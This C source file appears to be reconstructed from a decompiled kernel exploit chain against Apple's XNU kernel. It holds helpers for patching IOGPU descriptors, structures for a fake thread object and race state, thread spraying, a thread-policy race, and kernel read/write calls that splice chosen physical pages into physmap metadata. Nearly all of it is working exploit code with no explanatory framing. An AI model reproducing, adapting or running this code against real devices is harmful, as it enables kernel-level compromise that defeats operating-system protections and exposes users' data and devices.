static inline void iogpu_desc_store32(void *buf, size_t offset, uint32_t value)
{
  *(uint32_t *)((uint8_t *)buf + offset) = value;
}

static inline void iogpu_desc_store64(void *buf, size_t offset, uint64_t value)
{
  *(uint64_t *)((uint8_t *)buf + offset) = value;
}

static inline void iogpu_read_descriptor_256(__int64 iogpuCtx, __int64 offset, uint8_t scratch[0x100])
{
  memset(scratch, 0, 0x100);
  (*(void (__fastcall **)(__int64, __int64, uint8_t *, __int64, __int64))(iogpuCtx + 48))(
    iogpuCtx,
    offset,
    scratch,
    0x100,
    1);
}

static inline void iogpu_patch_descriptor32(__int64 iogpuCtx, __int64 offset, size_t fieldOffset, uint32_t value)
{
  uint8_t scratch[0x100];

  iogpu_read_descriptor_256(iogpuCtx, offset, scratch);
  iogpu_desc_store32(scratch, fieldOffset, value);
  (*(void (__fastcall **)(__int64, __int64, uint8_t *, __int64, __int64))(iogpuCtx + 64))(
    iogpuCtx,
    offset + fieldOffset,
    scratch + fieldOffset,
    4,
    1);
}

static inline void iogpu_patch_descriptor64(__int64 iogpuCtx, __int64 offset, size_t fieldOffset, uint64_t value)
{
  uint8_t scratch[0x100];

  iogpu_read_descriptor_256(iogpuCtx, offset, scratch);
  iogpu_desc_store64(scratch, fieldOffset, value);
  (*(void (__fastcall **)(__int64, __int64, uint8_t *, __int64, __int64))(iogpuCtx + 64))(
    iogpuCtx,
    offset + fieldOffset,
    scratch + fieldOffset,
    8,
    1);
}

static inline kern_return_t iogpu_remap_self_page(vm_address_t *address)
{
  vm_prot_t curProtection = 0;
  vm_prot_t maxProtection = 0;

  return vm_remap(
    mach_task_self_,
    address,
    0x4000u,
    0,
    0x4000,
    mach_task_self_,
    *address,
    0,
    &maxProtection,
    &curProtection,
    1u);
}

static inline kern_return_t iogpu_allocate_fixed(vm_address_t *address, vm_size_t size, int flags)
{
  return vm_allocate(mach_task_self_, address, size, flags);
}

static inline kern_return_t iogpu_map_memory_entry_fixed(vm_address_t *address, mem_entry_name_port_t port)
{
  return vm_map(mach_task_self_, address, 0x4000u, 0, 0x4000, port, 0, 0, 3, 3, 1u);
}

typedef struct PgtableWalkInfo
{
  uint64_t tableKva;
  uint64_t pageBase;
  uint32_t pageSize;
  uint32_t kindAndFlags;
  uint32_t prot;
  uint32_t reserved;
  uint64_t descriptor;
} PgtableWalkInfo;

typedef struct EntitlementFindConnectArgs
{
  uint64_t krwCtx;
  uint32_t task;
  uint32_t reserved0;
  CFTypeRef *cfOut;
  uint32_t ok;
  uint32_t reserved1;
} EntitlementFindConnectArgs;

typedef struct EntitlementIokitPayload
{
  uint64_t krwCtx;
  uint32_t task;
  uint32_t reserved;
  CFTypeRef cf;
} EntitlementIokitPayload;

typedef struct EntitlementIokitThreadArg
{
  EntitlementIokitPayload *payload;
  int status;
} EntitlementIokitThreadArg;

typedef struct CfCollectionApplyContext
{
  uint32_t status;
  uint32_t reserved;
  const void *object;
} CfCollectionApplyContext;

typedef __int64 (^VmcopyWritePhysmapBlock)(unsigned __int8 mapTag);

typedef struct VmcopyPackedMemoryEntry
{
  vm_address_t address;
  vm_address_t offset;
  vm_size_t size;
  mem_entry_name_port_t objectHandle;
  uint32_t pageInfoRef;
  uint32_t reserved;
  uint64_t objectKaddr;
  uint64_t pageInfoDataKaddr;
  uint64_t pageInfoKaddr;
  uint64_t pageInfoTableBase;
} VmcopyPackedMemoryEntry;

typedef struct VmcopyTargetThreadMapping
{
  uint64_t taskKaddr;
  uint64_t originalThreadPtr;
  uint64_t threadKaddr;
  uint64_t threadPageBase;
  uint64_t threadPageOffset;
  uint64_t threadPolicyKaddr;
  vm_address_t mappedTaskPage;
  vm_address_t mappedThreadPage;
  vm_address_t mappedThreadObject;
  __int64 *taskThreadSlot;
} VmcopyTargetThreadMapping;

static inline uint64_t vmcopy_page_info_ref_from_addr(uint64_t addr, uint64_t packedBase, uint64_t linearBase, uint32_t pageShift);
static inline uint64_t vmcopy_find_page_info_for_physical(
        __int64 kreadCtx,
        uint32_t pageRef,
        uint64_t packedBase,
        uint64_t linearBase,
        uint32_t pageShift,
        uint64_t physicalPage);

enum
{
  VMCOPY_KREAD_CTX_OFFSET = 8,
  VMCOPY_EXCEPTION_MSG_BUFFER_OFFSET = 16,
  VMCOPY_MAPPED_THREAD_OBJECT_OFFSET = 24,
  VMCOPY_CHILD_THREAD_PORT_OFFSET = 40,
  VMCOPY_FINAL_THREAD_OBJECT_OFFSET = 352,
  VMCOPY_TARGET_THREAD_KADDR_OFFSET = 360,
  VMCOPY_EXCEPTION_PORT_OFFSET = 368,
  VMCOPY_CHILD_THREAD_KADDR_OFFSET = 376,
  VMCOPY_FAKE_THREAD_STATE_OFFSET = 384,
  VMCOPY_FAKE_THREAD_STATE_BYTES = 0x110,
  VMCOPY_FAKE_THREAD_AST_OFFSET = 392,
  VMCOPY_FAKE_WAIT_LINK_OFFSET = 624,
  VMCOPY_FAKE_MSG_BACKPTR_OFFSET = 632,
  VMCOPY_FAKE_MARKER_OFFSET = 616,
  VMCOPY_FAKE_MARKER2_OFFSET = 640,
  VMCOPY_FAKE_FLAGS_OFFSET = 652,
  VMCOPY_THREAD_POLICY_BITS_OFFSET = 656,
  VMCOPY_FAKE_CONTINUATION_OFFSET = 552,
  VMCOPY_MESSAGE_KADDR_OFFSET = 664,
  VMCOPY_CAPTURED_THREAD_OFFSET = 672,
  VMCOPY_MAPPED_THREAD_POLICY_OFFSET = 272,
  VMCOPY_MAPPED_THREAD_NEXT_OFFSET = 296,
  VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES = 0x130,
  VMCOPY_MAPPED_THREAD_MAX_PAGE_OFFSET = 0x3EC0,
  VMCOPY_THREAD_POLICY_BAD_CACHELINE_OFFSET = 0x10,
  VMCOPY_THREAD_CACHELINE_MASK = 0x3F,
  VMCOPY_THREAD_SPRAY_COUNT = 256,
  VMCOPY_THREAD_POLICY_CONSTRAINT_FLAVOR = 2,
  VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS = 4,
  VMCOPY_THREAD_POLICY_MARK_TEST_BIT = 0x1000,
  VMCOPY_THREAD_POLICY_BASE_DEFAULT = 0x400204,
  VMCOPY_THREAD_POLICY_BASE_MARKED = 0x400208,
  VMCOPY_THREAD_POLICY_EXTRA_BITS = 0x3C0,
  VMCOPY_THREAD_POLICY_FLUSH_WIDE = 0x7FFFFFFF,
  VMCOPY_THREAD_POLICY_FLUSH_NARROW = 0x100,
  VMCOPY_RACE_DONE = 1,
  VMCOPY_RACE_RETRY = 87,
  VMCOPY_POLICY_MARK_XNU_MIN = 8796,
  VMCOPY_POLICY_MARK_DEFAULT_OFFSET = 184,
  VMCOPY_POLICY_MARK_LEGACY_CPU_OFFSET = 112,
  VMCOPY_POLICY_MARK_BIT = 0x8000,
  VMCOPY_EXCEPTION_MASK = 0x1BFE,
  VMCOPY_EXCEPTION_BEHAVIOR = 2,
  VMCOPY_EXCEPTION_FLAVOR = 17,
  VMCOPY_EXCEPTION_MSG_ALLOC_SIZE = 0x800,
  VMCOPY_EXCEPTION_MSG_RECV_SIZE = 0x400,
  VMCOPY_PAGE_INFO_PAYLOAD_WORDS = 30,
  VMCOPY_MEMORY_ENTRY_MAPPING_SIZE = 0xC000,
  VMCOPY_MEMORY_ENTRY_PAGE_SIZE = 0x4000,
  VMCOPY_PACKED_PAGE_INFO_BASE_BIAS = 0x1800000000LL,
  VMCOPY_FINAL_WAIT_LINK_MARKER = 0x41414141u,
  VMCOPY_FINAL_MSG_LINK_MARKER = 0x42424242u,
  VMCOPY_FINAL_ARG5_MARKER = 0x43434343u,
  VMCOPY_FINAL_ARG6_MARKER = 0x44444444u,
  VMCOPY_MARKER32 = 0xC0C0C0C0u,
  VMCOPY_MARKER64 = 0xC0C0C0C0C0C0C0C0ULL,
};

typedef struct VmcopyFakeThreadObject
{
  uint64_t threadKaddr;
  uint64_t ast;
  uint8_t gap_0x010[0x98];
  uint64_t continuation;
  uint8_t gap_0x0B0[0x38];
  uint64_t marker;
  uint64_t waitLink;
  uint64_t messageBackptr;
  uint64_t marker2;
  uint8_t gap_0x108[0x4];
  uint32_t flags;
} VmcopyFakeThreadObject;

typedef struct VmcopyRaceState
{
  uint64_t vtable;
  uint64_t kreadCtx;
  mach_msg_header_t *exceptionMessage;
  uint64_t mappedThreadObject;
  uint32_t mappedKernelTextPageRef;
  uint32_t reserved_0x024;
  thread_act_t childThreadPort;
  uint8_t capturedThreadObjectSnapshot[VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES];
  uint32_t reserved_0x15C;
  uint64_t finalThreadObject;
  uint64_t targetThreadKaddr;
  mach_port_t exceptionPort;
  uint32_t reserved_0x174;
  uint64_t childThreadKaddr;
  VmcopyFakeThreadObject fakeThreadObject;
  uint32_t threadPolicyBits;
  uint32_t threadPolicyBase;
  uint64_t messageKaddr;
  thread_act_t capturedThreadPort;
} VmcopyRaceState;

typedef struct VmcopyThreadObjectView
{
  uint8_t gap_0x000[0x88];
  uint64_t fakePageMarkers[2];
  uint8_t gap_0x098[0x58];
  uint64_t triggerWord;
  uint64_t msgLink;
  uint8_t gap_0x100[0x8];
  uint64_t waitLink;
  uint32_t policyBits;
  uint8_t gap_0x114[0x14];
  uint64_t next;
} VmcopyThreadObjectView;

typedef struct PhysmapPagePorts
{
  uint64_t objectId;
  vm_address_t mappedAddress;
  mem_entry_name_port_t workerMemoryEntry;
  mem_entry_name_port_t objectHandles[3];
  uint64_t retainedHandleCount;
} PhysmapPagePorts;

typedef struct PhysmapPageEntry
{
  struct PhysmapPageEntry *next;
  uint64_t failureStage;
  PhysmapPagePorts ports[3];
  vm_address_t firstWideMap;
  vm_address_t secondWideMap;
  vm_address_t thirdMap;
  vm_address_t thirdRemap;
  vm_address_t thirdRemapCopy;
  vm_address_t snapshotA;
  vm_address_t snapshotB;
  vm_address_t stagingMap;
  vm_address_t stagingMirror;
  vm_address_t retainedSource;
  vm_address_t retainedSourceMirror;
  vm_address_t retainedObjectMap;
  vm_address_t retainedObjectMirror;
  vm_address_t tailRemap;
  vm_address_t tailCopy;
} PhysmapPageEntry;

typedef struct PhysmapSmallPageEntry
{
  struct PhysmapSmallPageEntry *next;
  uint64_t failureStage;
  PhysmapPagePorts ports;
  vm_address_t mapping;
} PhysmapSmallPageEntry;

typedef struct PhysmapDualRootQueue
{
  void *roots[2];
  uint64_t preservedRootIndex;
  void *failedList;
  uint64_t failedCount;
} PhysmapDualRootQueue;

typedef struct PhysmapSingleRootQueue
{
  void *root;
  void *failedList;
  uint64_t failedCount;
} PhysmapSingleRootQueue;

typedef struct IogpuPrivateCtx
{
  uint8_t gap_0x000[0x438];
  vm_address_t largeBuffer;
  vm_address_t largeBufferMirror;
  vm_size_t largeBufferSize;
  vm_address_t descriptorArena;
  vm_address_t descriptorMirror;
  vm_size_t descriptorArenaSize;
  PhysmapDualRootQueue copyQueues[2];
  PhysmapSingleRootQueue firstPageQueue;
  uint64_t firstPageQueuePadding;
  PhysmapSingleRootQueue secondPageQueue;
  vm_address_t scratchFreePage;
  uint8_t gap_0x4F8[0x20];
  uint64_t descriptorObjectKaddr;
  uint64_t mappedObjectSize;
  uint64_t sourcePhys;
  uint64_t destinationKaddr;
  uint64_t auxKaddr;
  uint64_t descriptorPhysBase;
  vm_address_t scratchMap;
  vm_address_t targetMap;
  vm_size_t targetMapSize;
  vm_address_t sourceMap;
  vm_address_t mirrorMap;
  vm_size_t mirrorMapSize;
  vm_address_t auxMap;
  vm_address_t sourceMapAlias;
  vm_size_t sourceMapSize;
  uint8_t gap_0x590[0x58];
} IogpuPrivateCtx;

typedef struct PhysmapLoopState
{
  uint8_t gap_0x0000[0x3518];
  uint64_t marker;
  mach_port_t retainedWorkerMemoryEntries[64];
  uint32_t retainedWorkerMemoryEntryCount;
  uint8_t gap_0x3624[4];
  vm_address_t freeRegionBase;
  uint64_t freeRegionSize;
  mem_entry_name_port_t workerMemoryEntry;
  uint8_t workerStopFlag;
  uint8_t gap_0x363D[3];
  uint32_t readyWorkerCount;
} PhysmapLoopState;

typedef struct PhysmapReadResult
{
  vm_address_t mapping;
  vm_size_t requestedSize;
  vm_size_t mappedSize;
  uint64_t processedPageMask;
  uint32_t pageCount;
  mem_entry_name_port_t memoryEntry;
  mem_entry_name_port_t retainedMappingEntry;
  uint32_t reserved_0x2C;
  vm_address_t backupMappings[16];
  vm_address_t workerScratchPages[64];
} PhysmapReadResult;

#define VMCOPY_ASSERT_OFFSET(type, field, offset) \
  _Static_assert(offsetof(type, field) == (offset), #type "." #field " offset mismatch")

VMCOPY_ASSERT_OFFSET(VmcopyRaceState, kreadCtx, VMCOPY_KREAD_CTX_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, exceptionMessage, VMCOPY_EXCEPTION_MSG_BUFFER_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, mappedThreadObject, VMCOPY_MAPPED_THREAD_OBJECT_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, childThreadPort, VMCOPY_CHILD_THREAD_PORT_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, capturedThreadObjectSnapshot, 44);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, finalThreadObject, VMCOPY_FINAL_THREAD_OBJECT_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, targetThreadKaddr, VMCOPY_TARGET_THREAD_KADDR_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, exceptionPort, VMCOPY_EXCEPTION_PORT_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, childThreadKaddr, VMCOPY_CHILD_THREAD_KADDR_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, fakeThreadObject, VMCOPY_FAKE_THREAD_STATE_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, threadPolicyBits, VMCOPY_THREAD_POLICY_BITS_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, messageKaddr, VMCOPY_MESSAGE_KADDR_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyRaceState, capturedThreadPort, VMCOPY_CAPTURED_THREAD_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyFakeThreadObject, ast, VMCOPY_FAKE_THREAD_AST_OFFSET - VMCOPY_FAKE_THREAD_STATE_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyFakeThreadObject, continuation, VMCOPY_FAKE_CONTINUATION_OFFSET - VMCOPY_FAKE_THREAD_STATE_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyFakeThreadObject, marker, VMCOPY_FAKE_MARKER_OFFSET - VMCOPY_FAKE_THREAD_STATE_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyFakeThreadObject, waitLink, VMCOPY_FAKE_WAIT_LINK_OFFSET - VMCOPY_FAKE_THREAD_STATE_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyFakeThreadObject, messageBackptr, VMCOPY_FAKE_MSG_BACKPTR_OFFSET - VMCOPY_FAKE_THREAD_STATE_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyFakeThreadObject, marker2, VMCOPY_FAKE_MARKER2_OFFSET - VMCOPY_FAKE_THREAD_STATE_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyFakeThreadObject, flags, VMCOPY_FAKE_FLAGS_OFFSET - VMCOPY_FAKE_THREAD_STATE_OFFSET);
_Static_assert(sizeof(VmcopyFakeThreadObject) == VMCOPY_FAKE_THREAD_STATE_BYTES, "VmcopyFakeThreadObject size mismatch");
VMCOPY_ASSERT_OFFSET(VmcopyThreadObjectView, fakePageMarkers, 136);
VMCOPY_ASSERT_OFFSET(VmcopyThreadObjectView, triggerWord, 240);
VMCOPY_ASSERT_OFFSET(VmcopyThreadObjectView, msgLink, 248);
VMCOPY_ASSERT_OFFSET(VmcopyThreadObjectView, waitLink, 264);
VMCOPY_ASSERT_OFFSET(VmcopyThreadObjectView, policyBits, VMCOPY_MAPPED_THREAD_POLICY_OFFSET);
VMCOPY_ASSERT_OFFSET(VmcopyThreadObjectView, next, VMCOPY_MAPPED_THREAD_NEXT_OFFSET);
_Static_assert(sizeof(VmcopyThreadObjectView) == VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES, "VmcopyThreadObjectView size mismatch");
VMCOPY_ASSERT_OFFSET(PhysmapPagePorts, objectId, 0);
VMCOPY_ASSERT_OFFSET(PhysmapPagePorts, mappedAddress, 8);
VMCOPY_ASSERT_OFFSET(PhysmapPagePorts, workerMemoryEntry, 16);
VMCOPY_ASSERT_OFFSET(PhysmapPagePorts, objectHandles, 20);
VMCOPY_ASSERT_OFFSET(PhysmapPagePorts, retainedHandleCount, 32);
_Static_assert(sizeof(PhysmapPagePorts) == 40, "PhysmapPagePorts size mismatch");
VMCOPY_ASSERT_OFFSET(PhysmapSmallPageEntry, ports, 16);
VMCOPY_ASSERT_OFFSET(PhysmapSmallPageEntry, mapping, 56);
_Static_assert(sizeof(PhysmapSmallPageEntry) == 64, "PhysmapSmallPageEntry size mismatch");
VMCOPY_ASSERT_OFFSET(PhysmapPageEntry, ports[0], 16);
VMCOPY_ASSERT_OFFSET(PhysmapPageEntry, ports[1], 56);
VMCOPY_ASSERT_OFFSET(PhysmapPageEntry, ports[2], 96);
VMCOPY_ASSERT_OFFSET(PhysmapPageEntry, firstWideMap, 136);
VMCOPY_ASSERT_OFFSET(PhysmapPageEntry, tailCopy, 248);
_Static_assert(sizeof(PhysmapPageEntry) == 256, "PhysmapPageEntry size mismatch");
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, largeBuffer, 1080);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, descriptorArena, 1104);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, copyQueues, 1128);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, firstPageQueue, 1208);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, secondPageQueue, 1240);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, scratchFreePage, 1264);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, descriptorObjectKaddr, 1304);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, auxKaddr, 1336);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, scratchMap, 1352);
VMCOPY_ASSERT_OFFSET(IogpuPrivateCtx, sourceMapSize, 1416);
_Static_assert(sizeof(IogpuPrivateCtx) == 0x5E8, "IogpuPrivateCtx size mismatch");
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, marker, 13592);
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, retainedWorkerMemoryEntries, 13600);
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, retainedWorkerMemoryEntryCount, 13856);
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, freeRegionBase, 13864);
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, freeRegionSize, 13872);
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, workerMemoryEntry, 13880);
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, workerStopFlag, 13884);
VMCOPY_ASSERT_OFFSET(PhysmapLoopState, readyWorkerCount, 13888);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, requestedSize, 8);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, mappedSize, 16);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, processedPageMask, 24);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, pageCount, 32);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, memoryEntry, 36);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, retainedMappingEntry, 40);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, backupMappings, 48);
VMCOPY_ASSERT_OFFSET(PhysmapReadResult, workerScratchPages, 176);
_Static_assert(sizeof(PhysmapReadResult) == 688, "PhysmapReadResult size mismatch");

#undef VMCOPY_ASSERT_OFFSET

static inline PhysmapReadResult *physmap_read_result_at(uint64_t state, uint64_t index)
{
  return (PhysmapReadResult *)(state + 16 + sizeof(PhysmapReadResult) * index);
}

static inline __int64 vmcopy_run_exploit_thread_body(
        __int64 *state,
        thread_act_t *targetThread,
        void *threadList)
{
  __int64 result = 0;

  // Paired with the main race loop: wait until the parent has primed the
  // mapped thread object, terminate it, then refill the slot with new threads.
  __semwait_signal();
  while ( !*state )
    ;
  thread_terminate(*targetThread);
  for ( __int64 i = 0; i != 256; i += 4 )
    result = thread_create(mach_task_self_, (thread_act_t *)((char *)threadList + i));
  *targetThread = 0;
  *state = 2;
  return result;
}

static inline __int64 vmcopy_write_kaddr_to_physmap_body(
        VmcopyRaceState *state,
        __int64 kaddr,
        uint64_t pteIndex,
        uint64_t pteAddr,
        uint64_t pageTableBase,
        vm_size_t size,
        int pageShift,
        mem_entry_name_port_t objectHandle,
        uint64_t savedNext,
        uint64_t savedPrev,
        unsigned __int8 mapTag)
{
  mem_entry_name_port_t objectHandleCopy = 0;

  // Temporarily splice the chosen physical page into the physmap metadata.
  kwrite_u64_to_addr(state->kreadCtx, kaddr, pteIndex | (pteIndex << 32));
  __int64 pageIndex = (kaddr - pageTableBase) >> pageShift;
  kwrite_u64_to_addr(state->kreadCtx, pteAddr + 8LL, pageIndex | (pageIndex << 32));
  mach_make_memory_entry(
    mach_task_self_,
    &size,
    0,
    (mapTag << 24) | 0x10003,
    &objectHandleCopy,
    objectHandle);
  kwrite_u64_to_addr(state->kreadCtx, pteAddr + 8LL, savedNext);
  kwrite_u64_to_addr(state->kreadCtx, kaddr, savedPrev);
  return mach_port_destroy(mach_task_self_, objectHandleCopy);
}

static inline VmcopyWritePhysmapBlock vmcopy_create_write_physmap_block(
        VmcopyRaceState *state,
        __int64 kaddr,
        uint64_t pteIndex,
        uint64_t pteAddr,
        uint64_t pageTableBase,
        vm_size_t size,
        int pageShift,
        mem_entry_name_port_t objectHandle,
        uint64_t savedNext,
        uint64_t savedPrev)
{
  VmcopyWritePhysmapBlock block = ^__int64(unsigned __int8 mapTag) {
    return vmcopy_write_kaddr_to_physmap_body(
      state,
      kaddr,
      pteIndex,
      pteAddr,
      pageTableBase,
      size,
      pageShift,
      objectHandle,
      savedNext,
      savedPrev,
      mapTag);
  };

#if __has_feature(objc_arc)
  return [block copy];
#else
  return (VmcopyWritePhysmapBlock)Block_copy(block);
#endif
}

static inline __int64 vmcopy_trigger_thread_state_mod_body(
        VmcopyRaceState *vmcopyState,
        __int64 *triggerState)
{
  __semwait_signal();
  while ( !*triggerState )
    ;
  return thread_set_state(
           vmcopyState->capturedThreadPort,
           6,
           (thread_state_t)&vmcopyState->fakeThreadObject,
           0x44u);
}

static inline uint32_t vmcopy_find_thread_policy_offset(
        __int64 kreadCtx,
        uint64_t threadKobject,
        const integer_t policyInfo[4])
{
  uint32_t foundOffset = 0;

  for ( uint32_t offset = 252; offset < 0x2FC; offset += 4 )
  {
    if ( kread_u32_value(kreadCtx, threadKobject + offset + 4) != (uint32_t)policyInfo[0] )
      continue;
    if ( kread_u32_value(kreadCtx, threadKobject + offset + 8) != (uint32_t)policyInfo[1] )
      continue;
    if ( kread_u32_value(kreadCtx, threadKobject + offset + 12) == (uint32_t)policyInfo[2] )
      foundOffset = offset + 4;
  }

  return foundOffset;
}

static inline bool vmcopy_thread_port_is_live(thread_act_t thread)
{
  return thread + 1 >= 2;
}

static inline thread_act_t vmcopy_take_thread_for_kobject(
        __int64 kreadCtx,
        thread_act_t *threads,
        size_t threadListBytes,
        uint64_t wantedKobject)
{
  for ( size_t offset = 0; offset != threadListBytes; offset += sizeof(thread_act_t) )
  {
    thread_act_t *slot = (thread_act_t *)((char *)threads + offset);
    thread_act_t thread = *slot;

    if ( thread && get_task_kobject_addr_from_field32(kreadCtx, thread) == wantedKobject )
    {
      *slot = 0;
      return thread;
    }
  }

  return 0;
}

static inline void vmcopy_terminate_thread_if_live(thread_act_t *threadSlot)
{
  if ( vmcopy_thread_port_is_live(*threadSlot) )
  {
    thread_terminate(*threadSlot);
    *threadSlot = 0;
  }
}

static inline void vmcopy_terminate_thread_list(thread_act_t *threads, size_t threadListBytes)
{
  for ( size_t offset = 0; offset != threadListBytes; offset += sizeof(thread_act_t) )
  {
    thread_act_t thread = *(thread_act_t *)((char *)threads + offset);
    if ( thread )
      thread_terminate(thread);
  }
}

static inline void vmcopy_spray_threads(thread_act_t *lastThread, unsigned int count)
{
  for ( unsigned int i = 0; i < count; ++i )
    thread_create(mach_task_self_, lastThread);
}

static inline void vmcopy_spray_threads_and_clear_prev_link(
        __int64 kreadCtx,
        thread_act_t *lastThread,
        unsigned int count)
{
  for ( unsigned int i = 0; i < count; ++i )
  {
    thread_create(mach_task_self_, lastThread);
    if ( !*lastThread )
      continue;

    uint64_t threadKobject = get_task_kobject_addr_from_field32(kreadCtx, *lastThread);
    if ( validate_kaddr_range(*(uint64_t *)(kreadCtx + 32), threadKobject) )
    {
      kwrite_u64_to_addr(kreadCtx, threadKobject + qword_48008 - 8, 0);
      thread_terminate(*lastThread);
      *lastThread = 0;
    }
  }
}

static inline uint64_t vmcopy_set_low_priority_and_find_policy_offset(
        __int64 kreadCtx,
        pthread_t raceThread,
        integer_t policyInfo[VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS],
        unsigned int *policyOffset)
{
  thread_act_t raceMachThread = pthread_mach_thread_np(raceThread);
  policyInfo[0] = kVmcopyRaceLowPriorityPolicy[0];
  policyInfo[1] = kVmcopyRaceLowPriorityPolicy[1];
  policyInfo[2] = kVmcopyRaceLowPriorityPolicy[2];
  policyInfo[3] = kVmcopyRaceLowPriorityPolicy[3];
  thread_policy_set(
    raceMachThread,
    VMCOPY_THREAD_POLICY_CONSTRAINT_FLAVOR,
    policyInfo,
    VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS);

  uint64_t raceThreadKaddr = get_task_kobject_addr_from_field32(kreadCtx, raceMachThread);
  if ( !*policyOffset )
    *policyOffset = vmcopy_find_thread_policy_offset(kreadCtx, raceThreadKaddr, policyInfo);

  return raceThreadKaddr;
}

static inline void vmcopy_prepare_current_thread_policy_race(
        __int64 kreadCtx,
        uint32_t policyOffset,
        integer_t policyInfo[VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS])
{
  policyInfo[0] = kVmcopyRaceHighPriorityPolicy[0];
  policyInfo[1] = kVmcopyRaceHighPriorityPolicy[1];
  policyInfo[2] = kVmcopyRaceHighPriorityPolicy[2];
  policyInfo[3] = kVmcopyRaceHighPriorityPolicy[3];
  thread_policy_set(
    mach_thread_self(),
    VMCOPY_THREAD_POLICY_CONSTRAINT_FLAVOR,
    policyInfo,
    VMCOPY_THREAD_POLICY_CONSTRAINT_WORDS);

  uint64_t policyKaddr = get_task_kobject_addr_from_field32(kreadCtx, mach_thread_self()) + policyOffset;
  flush_cpu_cache(kreadCtx, policyKaddr, VMCOPY_THREAD_POLICY_FLUSH_WIDE);
  flush_cpu_cache(kreadCtx, policyKaddr + 4, VMCOPY_THREAD_POLICY_FLUSH_WIDE);
  flush_cpu_cache(kreadCtx, policyKaddr + 8, VMCOPY_THREAD_POLICY_FLUSH_WIDE);
  flush_cpu_cache(kreadCtx, policyKaddr + 12, VMCOPY_THREAD_POLICY_FLUSH_NARROW);
  kwrite_u64_to_addr(kreadCtx, policyKaddr + 16, 0xFFFFFFFFFFFFFFFLL);
}

static inline uint64_t vmcopy_apply_thread_policy_bits(VmcopyRaceState *state, VmcopyThreadObjectView *mappedThreadObject)
{
  uint64_t originalNext = mappedThreadObject->next;
  uint32_t policyBase = VMCOPY_THREAD_POLICY_BASE_DEFAULT;

  if ( (mappedThreadObject->policyBits & VMCOPY_THREAD_POLICY_MARK_TEST_BIT) != 0 )
    policyBase = VMCOPY_THREAD_POLICY_BASE_MARKED;

  state->threadPolicyBase = policyBase;
  uint32_t policyBits = policyBase | VMCOPY_THREAD_POLICY_EXTRA_BITS;
  state->threadPolicyBits = policyBits;
  mappedThreadObject->policyBits = policyBits;

  return originalNext;
}

static inline uint64_t vmcopy_wait_for_thread_slot_replacement(
        __int64 kreadCtx,
        __int64 *targetThreadSlot,
        uint64_t originalThreadKaddr,
        __int64 *raceState)
{
  thread_switch(0, 0, 0);
  *raceState = 1;

  while ( *raceState == 1 )
  {
    uint64_t replacementThreadKaddr = *targetThreadSlot;
    if ( !replacementThreadKaddr )
      continue;

    uint64_t previousThreadKaddr = *(targetThreadSlot - 1);
    if ( maybe_sptm_translate_kaddr(KRWCTX_FROM_RAW_FIELD(kreadCtx, 32), replacementThreadKaddr) == previousThreadKaddr )
    {
      *targetThreadSlot = originalThreadKaddr;
      return previousThreadKaddr;
    }
  }

  return 0;
}

static inline void vmcopy_mark_thread_policy_word_if_needed(
        __int64 kreadCtx,
        vm_address_t mappedThreadPage,
        uint64_t threadKobject)
{
  struct_krwCtx *krwCtx = KRWCTX_FROM_RAW_FIELD(kreadCtx, 32);
  bool useLegacyCpuOffset = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK);

  if ( krwCtx->xnuMajorVersion < VMCOPY_POLICY_MARK_XNU_MIN )
    return;

  uint64_t fieldOffset = VMCOPY_POLICY_MARK_DEFAULT_OFFSET;
  if ( useLegacyCpuOffset )
    fieldOffset = VMCOPY_POLICY_MARK_LEGACY_CPU_OFFSET;

  uint32_t *policyWord = (uint32_t *)(mappedThreadPage + (threadKobject & 0x3FFF) + fieldOffset);
  if ( (*policyWord & VMCOPY_POLICY_MARK_BIT) == 0 )
    *policyWord |= VMCOPY_POLICY_MARK_BIT;
}

